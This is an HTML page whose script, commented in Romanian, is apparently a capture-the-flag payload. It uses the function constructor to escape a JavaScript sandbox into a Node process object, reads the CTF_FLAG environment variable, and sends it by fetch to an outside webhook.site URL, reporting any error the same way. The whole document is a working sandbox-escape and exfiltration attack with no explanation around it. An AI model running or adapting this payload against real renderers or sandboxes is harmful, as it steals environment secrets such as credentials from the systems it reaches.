<!DOCTYPE html>
<html>
<body>
    <script>
        try {
            // Încercăm să extragem procesul folosind funcția constructor directă a obiectelor
            const p = (async ()=>{}).constructor("return process")();
            const steag = p.env.CTF_FLAG || "NU_E_AICI";

            // Trimitem rezultatul
            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_FINAL=" + steag);
        } catch (e) {
            // Dacă și asta eșuează, încercăm metoda de rezervă pentru contextul global
            try {
                const p2 = Function("return process")();
                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_FINAL=" + p2.env.CTF_FLAG);
            } catch (e2) {
                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?ERROR=" + btoa(e2.message));
            }
        }
    </script>
</body>
</html>
